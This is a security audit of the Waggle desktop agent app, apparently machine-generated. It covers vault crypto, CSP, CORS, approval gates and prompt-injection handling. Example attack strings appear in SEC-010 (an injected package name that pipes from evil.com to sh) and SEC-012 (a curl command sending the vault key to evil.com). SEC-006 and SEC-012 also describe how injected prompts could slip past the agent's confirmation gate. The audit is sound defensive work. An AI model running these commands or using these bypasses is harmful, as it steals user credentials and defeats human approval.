# 04A Application Security Audit

**Date**: 2026-03-20
**Auditor**: Automated (Claude Opus 4.6)
**Scope**: Waggle desktop app + local server — CSP, vault crypto, agent tools, input validation, sessions, connectors, dangerous patterns

---

## Findings Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 2     |
| HIGH     | 5     |
| MEDIUM   | 6     |
| LOW      | 4     |

---

## CRITICAL

### SEC-001: OAuth Refresh Tokens Stored Unencrypted in Vault Metadata
- **Severity**: CRITICAL
- **File**: `packages/core/src/vault.ts:156-161`
- **Issue**: `setConnectorCredential()` stores the `refreshToken` in the `metadata` field, which is written to `vault.json` as **plaintext JSON**. Only the `value` (access token) is encrypted via `this.set()`. The metadata object — including `refreshToken`, `expiresAt`, and `scopes` — is persisted alongside the encrypted blob but is itself **not encrypted**.
- **Impact**: An attacker with filesystem access can read `vault.json` and extract OAuth refresh tokens in cleartext. Refresh tokens are long-lived credentials that grant persistent access to user accounts (Google Calendar, GitHub, etc.) without requiring re-authentication.
- **Fix**: Encrypt the refresh token as a separate vault entry (e.g., `connector:{id}:refresh_token`) or encrypt the entire metadata blob. At minimum, the refresh token must go through the same `encrypt()` path as the primary credential value.

### SEC-002: Server CSP Allows `unsafe-eval` and `unsafe-inline` for Scripts
- **Severity**: CRITICAL
- **File**: `packages/server/src/local/security-middleware.ts:24`
- **Issue**: The security middleware CSP sets `script-src 'self' 'unsafe-inline' 'unsafe-eval'`. Both `unsafe-inline` and `unsafe-eval` completely defeat the purpose of CSP for script injection protection. This CSP header is sent on every API response.
- **Impact**: If any XSS vector exists (e.g., via `dangerouslySetInnerHTML` in the UI, or a reflected value in an API response rendered by the WebView), an attacker can execute arbitrary JavaScript. `unsafe-eval` also permits attacks via `eval()`, `Function()`, and `setTimeout('string')`.
- **Fix**: Remove `unsafe-eval` entirely. Replace `unsafe-inline` with nonce-based or hash-based CSP directives. If a library requires `unsafe-eval` (e.g., some markdown parsers), isolate it and document the necessity. The Tauri CSP (in `tauri.conf.json` line 41) correctly omits `unsafe-eval` from `script-src` — the server middleware should match.

---

## HIGH

### SEC-003: Vault Key File Has No Protection Beyond Filesystem Permissions
- **Severity**: HIGH
- **File**: `packages/core/src/vault.ts:56`
- **Issue**: The AES-256-GCM encryption key is a randomly generated 32-byte value stored in `.vault-key` as hex. File permissions are set to `0o600` (owner read/write only), but on Windows this permission flag is ignored — any user on the machine can read the file. There is no key derivation from a user password (PBKDF2, scrypt, argon2), no OS keychain integration, and no hardware-backed key storage.
- **Impact**: Any process or user on the same machine can read `.vault-key` and decrypt all vault contents (API keys, OAuth tokens, connector credentials). This is the master key for all secrets.
- **Fix**: For desktop deployment: integrate with the OS keychain (Windows Credential Manager via `keytar`, macOS Keychain, Linux Secret Service). Alternatively, derive the key from a user-provided passphrase using PBKDF2 with 600k+ iterations or argon2id. Store only the derived key in memory, never on disk.

### SEC-004: Bash Tool Has No Command Restrictions
- **Severity**: HIGH
- **File**: `packages/agent/src/system-tools.ts:55-116`
- **Issue**: The `bash` tool passes any command string directly to the system shell (`cmd.exe` or `/bin/sh`) without any filtering, sanitization, or sandboxing. While the confirmation gate (`confirmation.ts`) requires user approval for unknown/destructive commands, a malicious or jailbroken LLM response could craft commands that appear safe but are destructive (e.g., chaining with `&&` or `;` after a safe-looking prefix).
- **Impact**: A prompt injection attack could cause the agent to execute arbitrary system commands — data exfiltration, malware installation, credential theft, or system destruction. The confirmation gate helps but relies on regex pattern matching that can be bypassed (e.g., `ls ; rm -rf /` would not match `DESTRUCTIVE_BASH_PATTERNS` because the pattern checks the start of the command).
- **Fix**: (1) Run bash commands in a restricted sandbox (Docker container, firejail, or Windows Sandbox). (2) Add a denylist of dangerous binaries (`curl`, `wget`, `nc`, `powershell`, `certutil`) that cannot appear anywhere in the command, not just at the start. (3) Parse commands into AST before execution to detect chained operations. (4) Consider requiring approval for ALL bash commands, not just "unknown" ones.

### SEC-005: CORS Set to `origin: true` (Reflects Any Origin)
- **Severity**: HIGH
- **File**: `packages/server/src/local/index.ts:1122`
- **Issue**: The local server registers CORS with `{ origin: true }`, which reflects back any `Origin` header. Additionally, the notifications SSE endpoint (`notifications.ts:87`) hardcodes `Access-Control-Allow-Origin: *`. While this is a localhost-only server, any malicious website opened in the user's browser can make authenticated cross-origin requests to the Waggle server.
- **Impact**: A malicious website could call Waggle API endpoints (read vault secrets via `/api/vault/:name/reveal`, execute agent commands via `/api/chat`, read conversation history, access workspace data) from the user's browser session. The vault reveal endpoint has origin checking, but all other endpoints do not.
- **Fix**: Restrict CORS origins to the known Tauri app origins (`tauri://localhost`, `http://localhost:1420`, `http://127.0.0.1:1420`). Remove the wildcard from the notifications endpoint. The chat endpoint (`chat.ts:535`) also reflects the origin header — it should be restricted.

### SEC-006: Approval Gate Auto-Approves After 5-Minute Timeout
- **Severity**: HIGH
- **File**: `packages/server/src/local/routes/chat.ts:685-691`
- **Issue**: When the agent requests approval for a destructive operation (file write, git commit, capability install), the server waits for user response. If no response arrives within 5 minutes, the action is **automatically approved** (`resolve(true)`). This is intended to prevent infinite hangs but creates a security gap.
- **Impact**: A prompt injection could trigger a destructive operation and then keep the LLM generating tokens (long response) for 5 minutes, after which the destructive tool call auto-executes without user consent. This effectively bypasses the entire approval gate mechanism.
- **Fix**: Change the timeout behavior to **auto-deny** instead of auto-approve. Replace `resolve(true)` with `resolve(false)` on line 689. A hung approval should fail safe, not fail open. Users can always re-trigger the operation.

### SEC-007: Updater Public Key Is Empty
- **Severity**: HIGH
- **File**: `app/src-tauri/tauri.conf.json:56`
- **Issue**: The Tauri updater configuration has `"pubkey": ""` — an empty public key. This means auto-update signature verification is disabled. The updater endpoint points to `https://github.com/marolinik/waggle/releases/latest/download/latest.json`.
- **Impact**: If the GitHub account is compromised, or if a man-in-the-middle attack intercepts the update check (unlikely with HTTPS but possible with certificate compromise), a malicious update binary could be pushed to all users without signature verification.
- **Fix**: Generate an Ed25519 keypair using `tauri signer generate`, set the public key in `tauri.conf.json`, and sign all release builds with the private key. This is required before any production release.

---

## MEDIUM

### SEC-008: `dangerouslySetInnerHTML` in ChatMessage Without Strict DOMPurify Config
- **Severity**: MEDIUM
- **File**: `packages/ui/src/components/chat/ChatMessage.tsx:168,211`
- **Issue**: Assistant messages are rendered by converting markdown to HTML via `marked.parse()`, then sanitizing with `DOMPurify.sanitize(rawHtml)` using default configuration. Default DOMPurify allows `<a href="javascript:...">` in some configurations and does not restrict `<form>`, `<input>`, or `<iframe>` tags by default. The comment on line 165 says "Content sanitized with DOMPurify" but the sanitization uses no custom configuration.
- **Impact**: A malicious LLM response could inject phishing forms, clickjacking iframes, or social engineering content into the chat UI. While DOMPurify's defaults are generally good, the attack surface is the LLM output which is adversary-controlled in prompt injection scenarios.
- **Fix**: Use a restrictive DOMPurify configuration: `DOMPurify.sanitize(rawHtml, { ALLOWED_TAGS: ['p','br','strong','em','code','pre','ul','ol','li','a','h1','h2','h3','h4','h5','h6','blockquote','table','thead','tbody','tr','th','td','span','div','hr','img'], ALLOWED_ATTR: ['href','src','alt','class'], FORBID_TAGS: ['form','input','textarea','button','iframe','object','embed','script','style'] })`.

### SEC-009: `dangerouslySetInnerHTML` in CodePreview Without Sanitization
- **Severity**: MEDIUM
- **File**: `packages/ui/src/components/files/CodePreview.tsx:33`
- **Issue**: The `CodePreview` component accepts a `highlightedHtml` prop and renders it via `dangerouslySetInnerHTML={{ __html: highlightedHtml }}` with NO sanitization at all. The comment says "trusted content from desktop app shell" but the HTML comes from Shiki syntax highlighting, which processes code content that may originate from LLM responses or user-uploaded files.
- **Impact**: If an attacker can control the code content that gets syntax-highlighted (e.g., via a crafted file in a workspace, or LLM-generated code blocks), they could inject arbitrary HTML/JS through the Shiki output.
- **Fix**: Sanitize `highlightedHtml` with DOMPurify before rendering, even if it comes from Shiki. Use `DOMPurify.sanitize(highlightedHtml, { ALLOWED_TAGS: ['span', 'pre', 'code', 'div'], ALLOWED_ATTR: ['class', 'style'] })`.

### SEC-010: Command Injection in Marketplace Security Scanner
- **Severity**: MEDIUM
- **File**: `packages/marketplace/src/security.ts:386,425`
- **Issue**: Two command injection vectors: (1) `execSync('skill-scanner ' + args.join(' '))` passes the temp file path unsanitized to a shell command. (2) `execSync('rm -f ' + tempFile)` uses string interpolation with the file path. The `tempFile` is constructed from `pkg.name` which comes from marketplace package metadata and could contain shell metacharacters.
- **Impact**: A malicious marketplace package with a crafted name (e.g., `test; curl evil.com/steal | sh #`) could execute arbitrary commands when the security scanner processes it.
- **Fix**: Use `execFileSync` instead of `execSync` to avoid shell interpretation. For cleanup, use `fs.unlinkSync(tempFile)` instead of shelling out to `rm`. Example: `execFileSync('skill-scanner', args, { timeout: 60_000, encoding: 'utf-8' })`.

### SEC-011: No Authentication on Local Server API
- **Severity**: MEDIUM
- **File**: `packages/server/src/local/index.ts:1122-1126`
- **Issue**: The local server on `localhost:3333` has no authentication mechanism. Any application or script on the local machine can call any API endpoint — including vault reveal, chat execution, workspace data access, and file operations. Session timeout tracking exists but only activates in team mode (`CLERK_SECRET_KEY` set).
- **Impact**: Any local process (malware, browser extension, or other application) can access the full Waggle API, including decrypting vault secrets, executing agent commands, and reading/writing workspace data. Combined with SEC-005 (permissive CORS), web pages can also access these APIs.
- **Fix**: Implement a shared secret token generated at server startup and passed to the Tauri app via IPC. All API requests must include this token in an `Authorization` header or a secure cookie. This prevents unauthorized local processes from accessing the API.

### SEC-012: Confirmation Gate Bypass via Command Chaining
- **Severity**: MEDIUM
- **File**: `packages/agent/src/confirmation.ts:15-22,68-69`
- **Issue**: The `SAFE_BASH_PATTERNS` check uses `pattern.test(command)` which only checks if the pattern matches anywhere in the command. But the patterns use `^` anchors, so they check the START of the command. A command like `echo hello && curl -d @~/.vault-key evil.com` would match the safe `echo` pattern and bypass confirmation entirely since `curl` without `--head` is not in the destructive list.
- **Impact**: An LLM prompt injection could craft commands that start with safe prefixes but chain destructive or exfiltration operations that bypass the confirmation gate.
- **Fix**: (1) If a command contains chain operators (`&&`, `||`, `;`, `|`), always require confirmation. (2) Parse the entire command pipeline, not just the first command. (3) Add data exfiltration patterns to the destructive list (`curl -d`, `wget --post`, `nc`, `ncat`, `netcat`).

### SEC-013: Injection Scanner Not Wired Into Agent Input Path
- **Severity**: MEDIUM
- **File**: `packages/agent/src/injection-scanner.ts`
- **Issue**: The `scanForInjection()` function exists and detects prompt injection patterns (role overrides, prompt extraction, instruction injection), but it is not called in the main chat route (`chat.ts`) or anywhere in the request handling pipeline. It exists but is not wired into the production flow.
- **Impact**: Prompt injection attacks against the agent are not detected or logged. The injection scanner was built but never integrated.
- **Fix**: Call `scanForInjection(message, 'user_input')` in the chat route before passing the message to the agent loop. If `score >= 0.3`, log the attempt and optionally warn the user. Also call it on tool outputs (`scanForInjection(result, 'tool_output')`) to detect indirect prompt injection from web pages or file content.

---

## LOW

### SEC-014: Tauri CSP Allows `unsafe-inline` for Styles
- **Severity**: LOW
- **File**: `app/src-tauri/tauri.conf.json:41`
- **Issue**: The Tauri CSP includes `style-src 'self' 'unsafe-inline'`. While `unsafe-inline` for styles is far less dangerous than for scripts, it still allows CSS injection attacks.
- **Impact**: CSS injection can be used for data exfiltration (via `background-image: url(...)` on sensitive elements), UI redressing, or clickjacking within the WebView. Risk is low because the app is a local desktop application.
- **Fix**: Replace `unsafe-inline` styles with nonce-based or hash-based CSP for styles. This is a low priority for V1 but should be addressed post-launch.

### SEC-015: Tauri CSP Allows `img-src https:` (Any HTTPS Domain)
- **Severity**: LOW
- **File**: `app/src-tauri/tauri.conf.json:41`
- **Issue**: The Tauri CSP allows images from any HTTPS domain (`img-src 'self' data: https:`). This is broadly permissive.
- **Impact**: Allows loading tracking pixels or fingerprinting images from arbitrary domains. Could be used to detect when a user views specific content if an attacker controls the LLM output (embedding `![](https://evil.com/track)` in responses).
- **Fix**: Restrict `img-src` to known domains if possible, or at minimum add this to the threat model documentation. For markdown rendering, consider proxying external images.

### SEC-016: Vault Key File Permissions Ignored on Windows
- **Severity**: LOW
- **File**: `packages/core/src/vault.ts:56`
- **Issue**: `fs.writeFileSync(this.keyPath, key.toString('hex'), { mode: 0o600 })` sets Unix file permissions. On Windows (the primary deployment target for Tauri desktop), the `mode` option is silently ignored. Any user on the machine can read `.vault-key`.
- **Impact**: On multi-user Windows machines, other users can access the vault encryption key. On single-user desktops (the typical case), this is low risk.
- **Fix**: On Windows, use `icacls` or the Windows ACL API to restrict file access to the current user. Or integrate with Windows Credential Manager to avoid storing the key on disk entirely (see SEC-003).

### SEC-017: No Input Length Limits on Chat Messages
- **Severity**: LOW
- **File**: `packages/server/src/local/routes/chat.ts:516-521`
- **Issue**: The `/api/chat` endpoint validates that `message` is present but does not enforce any maximum length. Extremely long messages could cause excessive memory usage, slow down the agent loop, or trigger token limit errors downstream.
- **Impact**: A client could send a multi-megabyte message that consumes excessive memory or causes the LLM API call to fail with token limit errors. Risk is limited since this is a local server.
- **Fix**: Add a maximum message length check (e.g., 100KB) before processing. Return 413 if exceeded.

---

## Positive Findings (Things Done Well)

1. **Tauri CSP for scripts is correct**: `script-src 'self'` in `tauri.conf.json` — no `unsafe-eval` at the WebView level. The server-side CSP is the problem (SEC-002), not the Tauri config.

2. **Vault encryption is solid**: AES-256-GCM with random IV per encryption, authenticated encryption (GCM provides AEAD), proper use of `crypto.randomBytes()` for both key generation and IV generation. The algorithm choice and implementation are correct.

3. **File tool path traversal prevention**: `resolveSafe()` in `system-tools.ts:31-37` properly validates that resolved paths stay within the workspace directory, preventing `../` traversal attacks.

4. **CLI tool allowlist governance**: `cli-tools.ts` implements a proper allowlist with audit logging. Programs not in the allowlist are rejected. The `cli_execute` tool uses `execFileAsync` (not shell-based exec), which avoids shell interpretation for CLI tool arguments.

5. **Git tools use `execFileSync`**: `git-tools.ts` passes arguments as an array to `execFileSync`, preventing shell injection in git commands.

6. **Validate module for path segments**: `validate.ts` provides `assertSafeSegment()` using `/^[a-zA-Z0-9_-]+$/` — properly prevents path traversal in URL parameters. Used consistently across session and workspace routes.

7. **DOMPurify for chat rendering**: ChatMessage uses `DOMPurify.sanitize()` on markdown-rendered HTML before using `dangerouslySetInnerHTML`. This is the right approach, though configuration could be tighter (SEC-008).

8. **Confirmation gates exist**: Destructive operations (file writes, git commits, capability installs) require user approval. The system distinguishes safe/destructive patterns and has connector-specific risk assessment.

9. **Prompt injection scanner exists**: While not wired in (SEC-013), the `injection-scanner.ts` demonstrates awareness of the threat and provides a solid foundation for detection.

10. **Security headers**: The middleware sets `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `X-XSS-Protection`, `Referrer-Policy`, and `frame-ancestors 'none'`.

11. **Rate limiting**: In-memory sliding window rate limiter with periodic cleanup prevents abuse of API endpoints.

12. **Vault reveal endpoint has origin checking**: The `/api/vault/:name/reveal` endpoint checks the `Origin` and `Referer` headers to reject requests from external origins (though this alone is insufficient without fixing CORS).

13. **SQL injection prevention**: All database operations use parameterized queries via `better-sqlite3`'s `.prepare()` method. No string concatenation in SQL queries was found in production code.

---

## Overall Security Posture Assessment

**Rating: MODERATE — Requires fixes before production release**

The Waggle codebase demonstrates security awareness in several areas: vault encryption uses proper AES-256-GCM, file tools have path traversal prevention, CLI tools have allowlist governance, and SQL operations use parameterized queries throughout.

However, there are **two critical issues** that must be fixed before any production release:

1. **OAuth refresh tokens are stored in plaintext** (SEC-001) — this undermines the entire vault encryption model for connector credentials.
2. **Server CSP allows `unsafe-eval`** (SEC-002) — this defeats script injection protection entirely.

The **high-severity issues** around CORS permissiveness (SEC-005), auto-approve timeout (SEC-006), vault key storage (SEC-003), and bash tool safety (SEC-004) represent significant attack surface, especially given that this is a desktop application that runs a local server accessible to all processes on the machine.

**Priority fix order**:
1. SEC-001 (refresh token encryption) — data at rest vulnerability
2. SEC-006 (auto-approve to auto-deny) — one-line fix with large impact
3. SEC-005 (restrict CORS) — configuration change
4. SEC-002 (remove unsafe-eval from server CSP) — configuration change
5. SEC-010 (command injection in scanner) — use execFileSync
6. SEC-007 (updater pubkey) — required for release
7. SEC-003 (vault key in OS keychain) — architecture change, can be phased
8. SEC-004 (bash sandboxing) — architecture change, can be phased
